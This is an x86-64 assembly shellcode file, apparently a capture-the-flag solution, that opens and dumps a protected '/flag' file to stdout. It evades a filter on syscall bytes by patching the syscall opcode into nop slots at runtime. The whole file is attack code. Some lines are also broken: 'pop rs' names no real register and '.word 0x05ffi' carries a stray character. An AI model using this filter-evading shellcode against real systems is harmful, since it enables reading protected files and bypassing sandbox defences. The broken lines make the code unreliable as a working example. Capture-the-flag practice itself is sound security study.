// Just replace all register to 32 bit mode

.global _start
.intel_syntax noprefix



_start:
        // Open flag
        mov ax, [rip+syscall_inst_incomplete]
        and ax, 0x0f0f

        mov [rip+syscall], ax
        mov [rip+syscall_2], ax
        mov [rip+syscall_3], ax
        mov [rip+syscall_4], ax

        mov eax, 2 # open syscall
        lea edi, [rip + flagname]
        mov esi, 0
        mov edx, 1

syscall:
        nop
        nop

        // Open /dev/stdout, not always fixed to 1 for somereason
        mov esi, eax
        push rsi
        mov eax, 2
        lea edi, [rip + stdout]
        mov esi, 2
        mov edx, 1

syscall_2:
        nop
        nop

        // call sendfile syscall to stdout
        mov edi, eax
        pop rs
        mov eax, 40
        mov edx, 0
        mov r10, 1000

syscall_3:
        nop
        nop

        mov eax, 60
syscall_4:
        nop
        nop



flagname:
        .string "/flag"
stdout:
        .string "/dev/stdout"


syscall_inst_incomplete:
        .word 0x05ffi
